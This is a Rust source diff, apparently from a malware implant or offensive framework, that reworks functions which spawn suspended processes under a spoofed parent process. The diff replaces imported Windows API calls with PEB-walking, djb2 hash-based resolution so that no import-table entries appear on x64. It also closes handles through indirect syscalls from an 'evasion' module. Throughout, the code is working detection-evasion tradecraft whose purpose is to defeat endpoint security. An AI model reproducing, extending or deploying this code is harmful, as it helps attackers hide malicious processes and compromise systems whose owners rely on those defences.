@@ -1,15 +1,31 @@
 #[cfg(target_os = "windows")]
-use windows_sys::Win32::{
-    System::Threading::{
-        CreateProcessA, InitializeProcThreadAttributeList,
-        UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
-        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-        STARTUPINFOEXA, PROCESS_INFORMATION,
-        EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED,
-        PROCESS_CREATE_PROCESS, PROCESS_QUERY_INFORMATION,
-        STARTUPINFOA, LPPROC_THREAD_ATTRIBUTE_LIST,
-    },
+use windows_sys::Win32::System::Threading::{
+    // Types and constants only — no IAT function entries:
+    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+    STARTUPINFOEXA, PROCESS_INFORMATION,
+    EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED,
+    PROCESS_CREATE_PROCESS, PROCESS_QUERY_INFORMATION,
+    STARTUPINFOA, LPPROC_THREAD_ATTRIBUTE_LIST,
 };
+// Non-x64 fallback: import kernel32 process functions via IAT
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
+use windows_sys::Win32::System::Threading::{
+    CreateProcessA, InitializeProcThreadAttributeList,
+    UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
+};
+
+/// Resolve CreateProcessA and PROC_THREAD_ATTRIBUTE helpers from kernel32 by hash (x64 only).
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn k32_proc_fns() -> Option<(usize, usize, usize, usize)> {
+    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    let k32 = peb_get_module_base(djb2_hash_lower(b"kernel32.dll"));
+    if k32.is_null() { return None; }
+    let init = resolve_by_hash(k32, djb2_hash(b"InitializeProcThreadAttributeList"))? as usize;
+    let upd  = resolve_by_hash(k32, djb2_hash(b"UpdateProcThreadAttribute"))? as usize;
+    let del  = resolve_by_hash(k32, djb2_hash(b"DeleteProcThreadAttributeList"))? as usize;
+    let cpa  = resolve_by_hash(k32, djb2_hash(b"CreateProcessA"))? as usize;
+    Some((init, upd, del, cpa))
+}
 
 #[cfg(target_os = "windows")]
 #[repr(C)]
@@ -48,19 +64,37 @@ pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(
     );
     if status < 0 || h_parent == 0 { return None; }
 
-    let mut attr_size: usize = 0;
-    InitializeProcThreadAttributeList(core::ptr::null_mut(), 1, 0, &mut attr_size);
-    let mut attr_buf = vec![0u8; attr_size];
-    InitializeProcThreadAttributeList(attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST, 1, 0, &mut attr_size);
+    // Resolve kernel32 functions by hash (no IAT entry on x64)
+    #[cfg(target_arch = "x86_64")]
+    let (fn_init, fn_upd, fn_del, fn_cpa) = k32_proc_fns()?;
+    type InitAttrFn = unsafe extern "system" fn(*mut core::ffi::c_void, u32, u32, *mut usize) -> i32;
+    type UpdAttrFn  = unsafe extern "system" fn(*mut core::ffi::c_void, u32, usize, *const core::ffi::c_void, usize, *mut core::ffi::c_void, *const usize) -> i32;
+    type DelAttrFn  = unsafe extern "system" fn(*mut core::ffi::c_void);
+    type CpaFn      = unsafe extern "system" fn(*const u8, *mut u8, *const core::ffi::c_void, *const core::ffi::c_void, i32, u32, *const core::ffi::c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32;
+    #[cfg(target_arch = "x86_64")]
+    let (init_attr, upd_attr, del_attr, cpa): (InitAttrFn, UpdAttrFn, DelAttrFn, CpaFn) = (
+        core::mem::transmute(fn_init), core::mem::transmute(fn_upd),
+        core::mem::transmute(fn_del),  core::mem::transmute(fn_cpa),
+    );
+    #[cfg(not(target_arch = "x86_64"))]
+    let (init_attr, upd_attr, del_attr, cpa): (InitAttrFn, UpdAttrFn, DelAttrFn, CpaFn) = (
+        core::mem::transmute(InitializeProcThreadAttributeList as usize),
+        core::mem::transmute(UpdateProcThreadAttribute as usize),
+        core::mem::transmute(DeleteProcThreadAttributeList as usize),
+        core::mem::transmute(CreateProcessA as usize),
+    );
 
-    UpdateProcThreadAttribute(
-        attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST,
-        0,
+    let mut attr_size: usize = 0;
+    init_attr(core::ptr::null_mut(), 1, 0, &mut attr_size);
+    let mut attr_buf = vec![0u8; attr_size];
+    init_attr(attr_buf.as_mut_ptr() as *mut core::ffi::c_void, 1, 0, &mut attr_size);
+
+    upd_attr(
+        attr_buf.as_mut_ptr() as *mut core::ffi::c_void, 0,
         PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
         &h_parent as *const _ as *const core::ffi::c_void,
         core::mem::size_of::<isize>(),
-        core::ptr::null_mut(),
-        core::ptr::null(),
+        core::ptr::null_mut(), core::ptr::null(),
     );
 
     let mut si: STARTUPINFOEXA = core::mem::zeroed();
@@ -68,18 +102,15 @@ pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(
     si.lpAttributeList = attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST;
     let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
 
-    let ok = CreateProcessA(
-        core::ptr::null(),
-        target_exe.as_ptr() as *mut u8,
+    let ok = cpa(
+        core::ptr::null(), target_exe.as_ptr() as *mut u8,
         core::ptr::null(), core::ptr::null(),
-        0,
-        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
+        0, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
         core::ptr::null(), core::ptr::null(),
-        &si.StartupInfo as *const STARTUPINFOA,
-        &mut pi,
+        &si.StartupInfo as *const STARTUPINFOA, &mut pi,
     );
 
-    DeleteProcThreadAttributeList(attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST);
+    del_attr(attr_buf.as_mut_ptr() as *mut core::ffi::c_void);
     if let Some((ssn_c, tramp_c)) = crate::evasion::syscalls::get_ssn(b"NtClose") {
         crate::evasion::syscalls::indirect_syscall(ssn_c, tramp_c, h_parent as usize, 0, 0, 0, 0, 0);
     }
@@ -103,13 +134,23 @@ pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> 
             return Some(result);
         }
     }
-    use windows_sys::Win32::System::Threading::{
-        CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, CREATE_SUSPENDED,
+    // Fallback plain CreateProcessA — still hash-resolved on x64
+    #[cfg(target_arch = "x86_64")]
+    let cpa_plain: unsafe extern "system" fn(*const u8, *mut u8, *const core::ffi::c_void, *const core::ffi::c_void, i32, u32, *const core::ffi::c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32 = {
+        use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+        let k32 = peb_get_module_base(djb2_hash_lower(b"kernel32.dll"));
+        match resolve_by_hash(k32, djb2_hash(b"CreateProcessA")) {
+            Some(p) => core::mem::transmute(p),
+            None    => return None,
+        }
     };
+    #[cfg(not(target_arch = "x86_64"))]
+    let cpa_plain: unsafe extern "system" fn(*const u8, *mut u8, *const core::ffi::c_void, *const core::ffi::c_void, i32, u32, *const core::ffi::c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32 =
+        core::mem::transmute(CreateProcessA as usize);
     let mut si: STARTUPINFOA = core::mem::zeroed();
     si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
     let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
-    let ok = CreateProcessA(
+    let ok = cpa_plain(
         core::ptr::null(), target_exe.as_ptr() as *mut u8,
         core::ptr::null(), core::ptr::null(),
         0, CREATE_SUSPENDED, core::ptr::null(), core::ptr::null(),
